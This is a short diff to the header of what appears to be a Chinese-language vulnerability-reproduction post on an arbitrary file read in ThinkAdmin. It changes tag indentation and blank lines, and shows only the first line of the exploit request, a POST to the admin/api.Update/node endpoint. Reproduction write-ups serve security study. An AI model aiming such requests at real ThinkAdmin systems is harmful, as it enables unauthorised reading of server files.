@@ -3,11 +3,9 @@ categories:
     - 漏洞复现
 tags:
     - 漏洞复现
-	- Thinkadmin
+    - Thinkadmin
 ---
 ## Thinkadmin 任意文件读取复现
-
-
 
 ```
 POST /admin.html?s=admin/api.Update/node HTTP/1.1
